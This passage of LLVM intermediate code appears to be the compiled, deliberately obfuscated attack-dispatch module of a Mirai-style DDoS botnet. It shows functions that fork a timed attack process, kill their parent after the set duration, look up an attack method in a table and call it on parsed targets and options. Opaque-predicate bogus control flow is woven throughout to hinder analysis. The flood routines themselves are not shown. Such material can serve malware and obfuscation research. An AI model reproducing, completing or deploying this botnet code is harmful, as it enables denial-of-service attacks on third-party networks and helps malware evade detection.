  %287 = mul i32 %284, %286
  %288 = urem i32 %287, 2
  %289 = icmp eq i32 %288, 0
  %290 = icmp slt i32 %285, 10
  %291 = or i1 %289, %290
  br i1 %291, label %originalBB24, label %originalBB24alteredBB

originalBB24:                                     ; preds = %originalBB24alteredBB, %283
  %292 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %293 = icmp ne %struct.attack_target* %292, null
  %294 = load i32, i32* @x.7
  %295 = load i32, i32* @y.8
  %296 = sub i32 %294, 1
  %297 = mul i32 %294, %296
  %298 = urem i32 %297, 2
  %299 = icmp eq i32 %298, 0
  %300 = icmp slt i32 %295, 10
  %301 = or i1 %299, %300
  br i1 %301, label %originalBBpart227, label %originalBB24alteredBB

originalBBpart227:                                ; preds = %originalBB24
  br i1 %293, label %302, label %305

; <label>:302:                                    ; preds = %originalBBpart227
  %303 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %304 = bitcast %struct.attack_target* %303 to i8*
  call void @free(i8* %304) #6
  br label %305

; <label>:305:                                    ; preds = %302, %originalBBpart227
  %306 = load i32, i32* @x.7
  %307 = load i32, i32* @y.8
  %308 = sub i32 %306, 1
  %309 = mul i32 %306, %308
  %310 = urem i32 %309, 2
  %311 = icmp eq i32 %310, 0
  %312 = icmp slt i32 %307, 10
  %313 = or i1 %311, %312
  br i1 %313, label %originalBB29, label %originalBB29alteredBB

originalBB29:                                     ; preds = %originalBB29alteredBB, %305
  %314 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %315 = icmp ne %struct.attack_option* %314, null
  %316 = load i32, i32* @x.7
  %317 = load i32, i32* @y.8
  %318 = sub i32 %316, 1
  %319 = mul i32 %316, %318
  %320 = urem i32 %319, 2
  %321 = icmp eq i32 %320, 0
  %322 = icmp slt i32 %317, 10
  %323 = or i1 %321, %322
  br i1 %323, label %originalBBpart231, label %originalBB29alteredBB

originalBBpart231:                                ; preds = %originalBB29
  br i1 %315, label %324, label %328

; <label>:324:                                    ; preds = %originalBBpart231
  %325 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %326 = load i8, i8* %9, align 1
  %327 = zext i8 %326 to i32
  call void @free_opts(%struct.attack_option* %325, i32 %327)
  br label %328

; <label>:328:                                    ; preds = %324, %originalBBpart231
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %30
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %70
  %329 = load i32, i32* %4, align 4
  %330 = sext i32 %329 to i64
  %331 = load i8, i8* %8, align 1
  %332 = zext i8 %331 to i64
  %_ = sub i64 0, 5
  %gen = add i64 %_, %332
  %_2 = shl i64 5, %332
  %333 = mul i64 5, %332
  %334 = icmp ult i64 %330, %333
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %149
  %335 = load i32, i32* %4, align 4
  %336 = sext i32 %335 to i64
  %337 = icmp ult i64 %336, 1
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %213
  %338 = load i8*, i8** %3, align 8
  %339 = getelementptr inbounds i8, i8* %338, i32 1
  store i8* %339, i8** %3, align 8
  %340 = load i8, i8* %338, align 1
  store i8 %340, i8* %12, align 1
  %341 = load i32, i32* %4, align 4
  %342 = sext i32 %341 to i64
  %_11 = sub i64 0, %342
  %gen12 = add i64 %_11, 1
  %_13 = shl i64 %342, 1
  %_14 = shl i64 %342, 1
  %_15 = sub i64 0, %342
  %gen16 = add i64 %_15, 1
  %_17 = sub i64 %342, 1
  %gen18 = mul i64 %_17, 1
  %_19 = sub i64 %342, 1
  %gen20 = mul i64 %_19, 1
  %343 = sub i64 %342, 1
  %344 = trunc i64 %343 to i32
  store i32 %344, i32* %4, align 4
  %345 = load i32, i32* %4, align 4
  %346 = load i8, i8* %12, align 1
  %347 = zext i8 %346 to i32
  %348 = icmp slt i32 %345, %347
  br label %originalBB10

originalBB24alteredBB:                            ; preds = %originalBB24, %283
  %349 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %350 = icmp ne %struct.attack_target* %349, null
  br label %originalBB24

originalBB29alteredBB:                            ; preds = %originalBB29, %305
  %351 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %352 = icmp ne %struct.attack_option* %351, null
  br label %originalBB29
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) #2

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #2

; Function Attrs: noinline nounwind uwtable
define void @attack_start(i32, i8 zeroext, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %7 = load i32, i32* @x.9
  %8 = load i32, i32* @y.10
  %9 = sub i32 %7, 1
  %10 = mul i32 %7, %9
  %11 = urem i32 %10, 2
  %12 = icmp eq i32 %11, 0
  %13 = icmp slt i32 %8, 10
  %14 = or i1 %12, %13
  br i1 %14, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %6
  %15 = alloca i32, align 4
  %16 = alloca i8, align 1
  %17 = alloca i8, align 1
  %18 = alloca %struct.attack_target*, align 8
  %19 = alloca i8, align 1
  %20 = alloca %struct.attack_option*, align 8
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  store i32 %0, i32* %15, align 4
  store i8 %1, i8* %16, align 1
  store i8 %2, i8* %17, align 1
  store %struct.attack_target* %3, %struct.attack_target** %18, align 8
  store i8 %4, i8* %19, align 1
  store %struct.attack_option* %5, %struct.attack_option** %20, align 8
  %24 = call i32 @fork() #6
  store i32 %24, i32* %21, align 4
  %25 = load i32, i32* %21, align 4
  %26 = icmp eq i32 %25, -1
  %27 = load i32, i32* @x.9
  %28 = load i32, i32* @y.10
  %29 = sub i32 %27, 1
  %30 = mul i32 %27, %29
  %31 = urem i32 %30, 2
  %32 = icmp eq i32 %31, 0
  %33 = icmp slt i32 %28, 10
  %34 = or i1 %32, %33
  br i1 %34, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %26, label %38, label %35

; <label>:35:                                     ; preds = %originalBBpart2
  %36 = load i32, i32* %21, align 4
  %37 = icmp sgt i32 %36, 0
  br i1 %37, label %38, label %55

; <label>:38:                                     ; preds = %35, %originalBBpart2
  %39 = load i32, i32* @x.9
  %40 = load i32, i32* @y.10
  %41 = sub i32 %39, 1
  %42 = mul i32 %39, %41
  %43 = urem i32 %42, 2
  %44 = icmp eq i32 %43, 0
  %45 = icmp slt i32 %40, 10
  %46 = or i1 %44, %45
  br i1 %46, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %38
  %47 = load i32, i32* @x.9
  %48 = load i32, i32* @y.10
  %49 = sub i32 %47, 1
  %50 = mul i32 %47, %49
  %51 = urem i32 %50, 2
  %52 = icmp eq i32 %51, 0
  %53 = icmp slt i32 %48, 10
  %54 = or i1 %52, %53
  br i1 %54, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  ret void

; <label>:55:                                     ; preds = %35
  %56 = load i32, i32* @x.9
  %57 = load i32, i32* @y.10
  %58 = sub i32 %56, 1
  %59 = mul i32 %56, %58
  %60 = urem i32 %59, 2
  %61 = icmp eq i32 %60, 0
  %62 = icmp slt i32 %57, 10
  %63 = or i1 %61, %62
  br i1 %63, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %55
  %64 = call i32 @fork() #6
  store i32 %64, i32* %22, align 4
  %65 = load i32, i32* %22, align 4
  %66 = icmp eq i32 %65, -1
  %67 = load i32, i32* @x.9
  %68 = load i32, i32* @y.10
  %69 = sub i32 %67, 1
  %70 = mul i32 %67, %69
  %71 = urem i32 %70, 2
  %72 = icmp eq i32 %71, 0
  %73 = icmp slt i32 %68, 10
  %74 = or i1 %72, %73
  br i1 %74, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %66, label %75, label %92

; <label>:75:                                     ; preds = %originalBBpart28
  %76 = load i32, i32* @x.9
  %77 = load i32, i32* @y.10
  %78 = sub i32 %76, 1
  %79 = mul i32 %76, %78
  %80 = urem i32 %79, 2
  %81 = icmp eq i32 %80, 0
  %82 = icmp slt i32 %77, 10
  %83 = or i1 %81, %82
  br i1 %83, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %75
  call void @exit(i32 0) #8
  %84 = load i32, i32* @x.9
  %85 = load i32, i32* @y.10
  %86 = sub i32 %84, 1
  %87 = mul i32 %84, %86
  %88 = urem i32 %87, 2
  %89 = icmp eq i32 %88, 0
  %90 = icmp slt i32 %85, 10
  %91 = or i1 %89, %90
  br i1 %91, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  unreachable

; <label>:92:                                     ; preds = %originalBBpart28
  %93 = load i32, i32* %22, align 4
  %94 = icmp eq i32 %93, 0
  br i1 %94, label %95, label %116

; <label>:95:                                     ; preds = %92
  %96 = load i32, i32* @x.9
  %97 = load i32, i32* @y.10
  %98 = sub i32 %96, 1
  %99 = mul i32 %96, %98
  %100 = urem i32 %99, 2
  %101 = icmp eq i32 %100, 0
  %102 = icmp slt i32 %97, 10
  %103 = or i1 %101, %102
  br i1 %103, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %95
  %104 = load i32, i32* %15, align 4
  %105 = call i32 @sleep(i32 %104)
  %106 = call i32 @getppid() #6
  %107 = call i32 @kill(i32 %106, i32 9) #6
  call void @exit(i32 0) #8
  %108 = load i32, i32* @x.9
  %109 = load i32, i32* @y.10
  %110 = sub i32 %108, 1
  %111 = mul i32 %108, %110
  %112 = urem i32 %111, 2
  %113 = icmp eq i32 %112, 0
  %114 = icmp slt i32 %109, 10
  %115 = or i1 %113, %114
  br i1 %115, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  unreachable

; <label>:116:                                    ; preds = %92
  %117 = load i32, i32* @x.9
  %118 = load i32, i32* @y.10
  %119 = sub i32 %117, 1
  %120 = mul i32 %117, %119
  %121 = urem i32 %120, 2
  %122 = icmp eq i32 %121, 0
  %123 = icmp slt i32 %118, 10
  %124 = or i1 %122, %123
  br i1 %124, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %116
  store i32 0, i32* %23, align 4
  %125 = load i32, i32* @x.9
  %126 = load i32, i32* @y.10
  %127 = sub i32 %125, 1
  %128 = mul i32 %125, %127
  %129 = urem i32 %128, 2
  %130 = icmp eq i32 %129, 0
  %131 = icmp slt i32 %126, 10
  %132 = or i1 %130, %131
  br i1 %132, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br label %133

; <label>:133:                                    ; preds = %163, %originalBBpart220
  %134 = load i32, i32* %23, align 4
  %135 = load i8, i8* @methods_len, align 1
  %136 = zext i8 %135 to i32
  %137 = icmp slt i32 %134, %136
  br i1 %137, label %138, label %166

; <label>:138:                                    ; preds = %133
  %139 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %140 = load i32, i32* %23, align 4
  %141 = sext i32 %140 to i64
  %142 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %139, i64 %141
  %143 = load %struct.attack_method*, %struct.attack_method** %142, align 8
  %144 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %143, i32 0, i32 1
  %145 = load i8, i8* %144, align 8
  %146 = zext i8 %145 to i32
  %147 = load i8, i8* %16, align 1
  %148 = zext i8 %147 to i32
  %149 = icmp eq i32 %146, %148
  br i1 %149, label %150, label %162

; <label>:150:                                    ; preds = %138
  %151 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %152 = load i32, i32* %23, align 4
  %153 = sext i32 %152 to i64
  %154 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %151, i64 %153
  %155 = load %struct.attack_method*, %struct.attack_method** %154, align 8
  %156 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %155, i32 0, i32 0
  %157 = load void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %156, align 8
  %158 = load i8, i8* %17, align 1
  %159 = load %struct.attack_target*, %struct.attack_target** %18, align 8
  %160 = load i8, i8* %19, align 1
  %161 = load %struct.attack_option*, %struct.attack_option** %20, align 8
  call void %157(i8 zeroext %158, %struct.attack_target* %159, i8 zeroext %160, %struct.attack_option* %161)
  br label %166

; <label>:162:                                    ; preds = %138
  br label %163

; <label>:163:                                    ; preds = %162
  %164 = load i32, i32* %23, align 4
  %165 = add nsw i32 %164, 1
  store i32 %165, i32* %23, align 4
  br label %133

; <label>:166:                                    ; preds = %150, %133
  call void @exit(i32 0) #8
  unreachable

originalBBalteredBB:                              ; preds = %originalBB, %6
  %167 = alloca i32, align 4
  %168 = alloca i8, align 1
  %169 = alloca i8, align 1
  %170 = alloca %struct.attack_target*, align 8
  %171 = alloca i8, align 1
  %172 = alloca %struct.attack_option*, align 8
  %173 = alloca i32, align 4
  %174 = alloca i32, align 4
  %175 = alloca i32, align 4
  store i32 %0, i32* %167, align 4
  store i8 %1, i8* %168, align 1
  store i8 %2, i8* %169, align 1
  store %struct.attack_target* %3, %struct.attack_target** %170, align 8
  store i8 %4, i8* %171, align 1
  store %struct.attack_option* %5, %struct.attack_option** %172, align 8
  %176 = call i32 @fork() #6
  store i32 %176, i32* %173, align 4
  %177 = load i32, i32* %173, align 4
  %178 = icmp eq i32 %177, -1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %38
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %55
  %179 = call i32 @fork() #6
  store i32 %179, i32* %22, align 4
  %180 = load i32, i32* %22, align 4
  %181 = icmp eq i32 %180, -1
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %75
  call void @exit(i32 0) #8
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %95
  %182 = load i32, i32* %15, align 4
  %183 = call i32 @sleep(i32 %182)
  %184 = call i32 @getppid() #6
  %185 = call i32 @kill(i32 %184, i32 9) #6
  call void @exit(i32 0) #8
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %116
  store i32 0, i32* %23, align 4
  br label %originalBB18
}

; Function Attrs: nounwind
declare void @free(i8*) #1

; Function Attrs: noinline nounwind uwtable
define internal void @free_opts(%struct.attack_option*, i32) #0 {
  %3 = alloca %struct.attack_option*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store %struct.attack_option* %0, %struct.attack_option** %3, align 8
  store i32 %1, i32* %4, align 4
  %6 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %7 = icmp eq %struct.attack_option* %6, null
  br i1 %7, label %8, label %9

; <label>:8:                                      ; preds = %2
  br label %68

; <label>:9:                                      ; preds = %2
  %10 = load i32, i32* @x.11
  %11 = load i32, i32* @y.12
  %12 = sub i32 %10, 1
  %13 = mul i32 %10, %12
  %14 = urem i32 %13, 2
  %15 = icmp eq i32 %14, 0
  %16 = icmp slt i32 %11, 10
  %17 = or i1 %15, %16
  br i1 %17, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %9
  store i32 0, i32* %5, align 4
  %18 = load i32, i32* @x.11
  %19 = load i32, i32* @y.12
  %20 = sub i32 %18, 1
  %21 = mul i32 %18, %20
  %22 = urem i32 %21, 2
  %23 = icmp eq i32 %22, 0
  %24 = icmp slt i32 %19, 10
  %25 = or i1 %23, %24
  br i1 %25, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %26

; <label>:26:                                     ; preds = %62, %originalBBpart2
  %27 = load i32, i32* %5, align 4
  %28 = load i32, i32* %4, align 4
  %29 = icmp slt i32 %27, %28
  br i1 %29, label %30, label %65

; <label>:30:                                     ; preds = %26
  %31 = load i32, i32* @x.11
  %32 = load i32, i32* @y.12
  %33 = sub i32 %31, 1
  %34 = mul i32 %31, %33
  %35 = urem i32 %34, 2
  %36 = icmp eq i32 %35, 0
  %37 = icmp slt i32 %32, 10
  %38 = or i1 %36, %37
  br i1 %38, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %30
  %39 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %40 = load i32, i32* %5, align 4
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %39, i64 %41
  %43 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %42, i32 0, i32 0
  %44 = load i8*, i8** %43, align 8
  %45 = icmp ne i8* %44, null
  %46 = load i32, i32* @x.11
  %47 = load i32, i32* @y.12
  %48 = sub i32 %46, 1
  %49 = mul i32 %46, %48
  %50 = urem i32 %49, 2
  %51 = icmp eq i32 %50, 0
  %52 = icmp slt i32 %47, 10
  %53 = or i1 %51, %52
  br i1 %53, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %45, label %54, label %61

; <label>:54:                                     ; preds = %originalBBpart24
  %55 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %56 = load i32, i32* %5, align 4
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %55, i64 %57
  %59 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %58, i32 0, i32 0
  %60 = load i8*, i8** %59, align 8
  call void @free(i8* %60) #6
  br label %61

; <label>:61:                                     ; preds = %54, %originalBBpart24
  br label %62

; <label>:62:                                     ; preds = %61
  %63 = load i32, i32* %5, align 4
  %64 = add nsw i32 %63, 1
  store i32 %64, i32* %5, align 4
  br label %26

; <label>:65:                                     ; preds = %26
  %66 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %67 = bitcast %struct.attack_option* %66 to i8*
  call void @free(i8* %67) #6
  br label %68

; <label>:68:                                     ; preds = %65, %8
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %9
  store i32 0, i32* %5, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %30
  %69 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %70 = load i32, i32* %5, align 4
  %71 = sext i32 %70 to i64
  %72 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %69, i64 %71
  %73 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %72, i32 0, i32 0
  %74 = load i8*, i8** %73, align 8
  %75 = icmp ne i8* %74, null
  br label %originalBB1
}

; Function Attrs: nounwind
declare i32 @fork() #1

; Function Attrs: noreturn nounwind
declare void @exit(i32) #3

declare i32 @sleep(i32) #4

; Function Attrs: nounwind
declare i32 @getppid() #1

; Function Attrs: noinline nounwind uwtable
define i8* @attack_get_opt_str(i8 zeroext, %struct.attack_option*, i8 zeroext, i8*) #0 {
  %5 = load i32, i32* @x.13
  %6 = load i32, i32* @y.14
  %7 = sub i32 %5, 1
  %8 = mul i32 %5, %7
  %9 = urem i32 %8, 2
  %10 = icmp eq i32 %9, 0
  %11 = icmp slt i32 %6, 10
  %12 = or i1 %10, %11
  br i1 %12, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %4
  %13 = alloca i8*, align 8
  %14 = alloca i8, align 1
  %15 = alloca %struct.attack_option*, align 8
  %16 = alloca i8, align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  store i8 %0, i8* %14, align 1
  store %struct.attack_option* %1, %struct.attack_option** %15, align 8
  store i8 %2, i8* %16, align 1
  store i8* %3, i8** %17, align 8
  store i32 0, i32* %18, align 4
  %19 = load i32, i32* @x.13
  %20 = load i32, i32* @y.14
  %21 = sub i32 %19, 1
  %22 = mul i32 %19, %21
  %23 = urem i32 %22, 2
  %24 = icmp eq i32 %23, 0
  %25 = icmp slt i32 %20, 10
  %26 = or i1 %24, %25
  br i1 %26, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %27

; <label>:27:                                     ; preds = %83, %originalBBpart2
  %28 = load i32, i32* %18, align 4
  %29 = load i8, i8* %14, align 1
  %30 = zext i8 %29 to i32
  %31 = icmp slt i32 %28, %30
  br i1 %31, label %32, label %86

; <label>:32:                                     ; preds = %27
  %33 = load %struct.attack_option*, %struct.attack_option** %15, align 8
  %34 = load i32, i32* %18, align 4
  %35 = sext i32 %34 to i64
  %36 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %33, i64 %35
  %37 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %36, i32 0, i32 1
  %38 = load i8, i8* %37, align 8
  %39 = zext i8 %38 to i32
  %40 = load i8, i8* %16, align 1
  %41 = zext i8 %40 to i32
  %42 = icmp eq i32 %39, %41
  br i1 %42, label %43, label %66

; <label>:43:                                     ; preds = %32
  %44 = load i32, i32* @x.13
  %45 = load i32, i32* @y.14
  %46 = sub i32 %44, 1
  %47 = mul i32 %44, %46
  %48 = urem i32 %47, 2
  %49 = icmp eq i32 %48, 0
  %50 = icmp slt i32 %45, 10
  %51 = or i1 %49, %50
  br i1 %51, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %43
  %52 = load %struct.attack_option*, %struct.attack_option** %15, align 8
  %53 = load i32, i32* %18, align 4
  %54 = sext i32 %53 to i64
  %55 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %52, i64 %54
  %56 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %55, i32 0, i32 0
  %57 = load i8*, i8** %56, align 8
  store i8* %57, i8** %13, align 8
  %58 = load i32, i32* @x.13
  %59 = load i32, i32* @y.14
  %60 = sub i32 %58, 1
  %61 = mul i32 %58, %60
  %62 = urem i32 %61, 2
  %63 = icmp eq i32 %62, 0
  %64 = icmp slt i32 %59, 10
  %65 = or i1 %63, %64
  br i1 %65, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %88

; <label>:66:                                     ; preds = %32
  %67 = load i32, i32* @x.13
  %68 = load i32, i32* @y.14
  %69 = sub i32 %67, 1
  %70 = mul i32 %67, %69
  %71 = urem i32 %70, 2
  %72 = icmp eq i32 %71, 0
  %73 = icmp slt i32 %68, 10
  %74 = or i1 %72, %73
  br i1 %74, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %66
  %75 = load i32, i32* @x.13
  %76 = load i32, i32* @y.14
  %77 = sub i32 %75, 1
  %78 = mul i32 %75, %77
  %79 = urem i32 %78, 2
  %80 = icmp eq i32 %79, 0
  %81 = icmp slt i32 %76, 10
  %82 = or i1 %80, %81
  br i1 %82, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %83

; <label>:83:                                     ; preds = %originalBBpart28
  %84 = load i32, i32* %18, align 4
  %85 = add nsw i32 %84, 1
  store i32 %85, i32* %18, align 4
  br label %27

; <label>:86:                                     ; preds = %27
  %87 = load i8*, i8** %17, align 8
  store i8* %87, i8** %13, align 8
  br label %88

; <label>:88:                                     ; preds = %86, %originalBBpart24
  %89 = load i32, i32* @x.13
  %90 = load i32, i32* @y.14
  %91 = sub i32 %89, 1
  %92 = mul i32 %89, %91
  %93 = urem i32 %92, 2
  %94 = icmp eq i32 %93, 0
  %95 = icmp slt i32 %90, 10
  %96 = or i1 %94, %95
  br i1 %96, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %88
  %97 = load i8*, i8** %13, align 8
  %98 = load i32, i32* @x.13
  %99 = load i32, i32* @y.14
  %100 = sub i32 %98, 1
  %101 = mul i32 %98, %100
  %102 = urem i32 %101, 2
  %103 = icmp eq i32 %102, 0
  %104 = icmp slt i32 %99, 10
  %105 = or i1 %103, %104
  br i1 %105, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  ret i8* %97

originalBBalteredBB:                              ; preds = %originalBB, %4
  %106 = alloca i8*, align 8
  %107 = alloca i8, align 1
  %108 = alloca %struct.attack_option*, align 8
  %109 = alloca i8, align 1
  %110 = alloca i8*, align 8
  %111 = alloca i32, align 4
  store i8 %0, i8* %107, align 1
  store %struct.attack_option* %1, %struct.attack_option** %108, align 8
  store i8 %2, i8* %109, align 1
  store i8* %3, i8** %110, align 8
  store i32 0, i32* %111, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %43
  %112 = load %struct.attack_option*, %struct.attack_option** %15, align 8
  %113 = load i32, i32* %18, align 4
  %114 = sext i32 %113 to i64
  %115 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %112, i64 %114
  %116 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %115, i32 0, i32 0
  %117 = load i8*, i8** %116, align 8
  store i8* %117, i8** %13, align 8
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %66
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %88
  %118 = load i8*, i8** %13, align 8
  br label %originalBB10
}

; Function Attrs: noinline nounwind uwtable
define i32 @attack_get_opt_int(i8 zeroext, %struct.attack_option*, i8 zeroext, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i8, align 1
  %7 = alloca %struct.attack_option*, align 8
  %8 = alloca i8, align 1
  %9 = alloca i32, align 4
  %10 = alloca i8*, align 8
  store i8 %0, i8* %6, align 1
  store %struct.attack_option* %1, %struct.attack_option** %7, align 8
  store i8 %2, i8* %8, align 1
  store i32 %3, i32* %9, align 4
  %11 = load i8, i8* %6, align 1
  %12 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %13 = load i8, i8* %8, align 1
  %14 = call i8* @attack_get_opt_str(i8 zeroext %11, %struct.attack_option* %12, i8 zeroext %13, i8* null)
  store i8* %14, i8** %10, align 8
  %15 = load i8*, i8** %10, align 8
  %16 = icmp eq i8* %15, null
  br i1 %16, label %17, label %19

; <label>:17:                                     ; preds = %4
  %18 = load i32, i32* %9, align 4
  store i32 %18, i32* %5, align 4
  br label %22

; <label>:19:                                     ; preds = %4
  %20 = load i8*, i8** %10, align 8
  %21 = call i32 @util_atoi(i8* %20, i32 10)
  store i32 %21, i32* %5, align 4
  br label %22

; <label>:22:                                     ; preds = %19, %17
  %23 = load i32, i32* %5, align 4
  ret i32 %23
}

; Function Attrs: noinline nounwind uwtable
define i32 @attack_get_opt_ip(i8 zeroext, %struct.attack_option*, i8 zeroext, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i8, align 1
  %7 = alloca %struct.attack_option*, align 8
  %8 = alloca i8, align 1
  %9 = alloca i32, align 4
  %10 = alloca i8*, align 8
  store i8 %0, i8* %6, align 1
  store %struct.attack_option* %1, %struct.attack_option** %7, align 8
  store i8 %2, i8* %8, align 1
  store i32 %3, i32* %9, align 4
  %11 = load i8, i8* %6, align 1
  %12 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %13 = load i8, i8* %8, align 1
  %14 = call i8* @attack_get_opt_str(i8 zeroext %11, %struct.attack_option* %12, i8 zeroext %13, i8* null)
  store i8* %14, i8** %10, align 8
  %15 = load i8*, i8** %10, align 8
  %16 = icmp eq i8* %15, null
  br i1 %16, label %17, label %35

; <label>:17:                                     ; preds = %4
  %18 = load i32, i32* @x.17
  %19 = load i32, i32* @y.18
  %20 = sub i32 %18, 1
  %21 = mul i32 %18, %20
  %22 = urem i32 %21, 2
  %23 = icmp eq i32 %22, 0
  %24 = icmp slt i32 %19, 10
  %25 = or i1 %23, %24
  br i1 %25, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %17
  %26 = load i32, i32* %9, align 4
  store i32 %26, i32* %5, align 4
  %27 = load i32, i32* @x.17
  %28 = load i32, i32* @y.18
  %29 = sub i32 %27, 1
  %30 = mul i32 %27, %29
  %31 = urem i32 %30, 2
  %32 = icmp eq i32 %31, 0
  %33 = icmp slt i32 %28, 10
  %34 = or i1 %32, %33
  br i1 %34, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %54

; <label>:35:                                     ; preds = %4
  %36 = load i32, i32* @x.17
  %37 = load i32, i32* @y.18
  %38 = sub i32 %36, 1
  %39 = mul i32 %36, %38
  %40 = urem i32 %39, 2
  %41 = icmp eq i32 %40, 0
  %42 = icmp slt i32 %37, 10
  %43 = or i1 %41, %42
  br i1 %43, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %35
  %44 = load i8*, i8** %10, align 8
  %45 = call i32 @inet_addr(i8* %44) #6
  store i32 %45, i32* %5, align 4
  %46 = load i32, i32* @x.17
  %47 = load i32, i32* @y.18
  %48 = sub i32 %46, 1
  %49 = mul i32 %46, %48
  %50 = urem i32 %49, 2
  %51 = icmp eq i32 %50, 0
  %52 = icmp slt i32 %47, 10
  %53 = or i1 %51, %52
  br i1 %53, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %54

; <label>:54:                                     ; preds = %originalBBpart24, %originalBBpart2
  %55 = load i32, i32* %5, align 4
  ret i32 %55

originalBBalteredBB:                              ; preds = %originalBB, %17
  %56 = load i32, i32* %9, align 4
  store i32 %56, i32* %5, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %35
  %57 = load i8*, i8** %10, align 8
  %58 = call i32 @inet_addr(i8* %57) #6
  store i32 %58, i32* %5, align 4
  br label %originalBB1
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #1

; Function Attrs: noinline nounwind uwtable
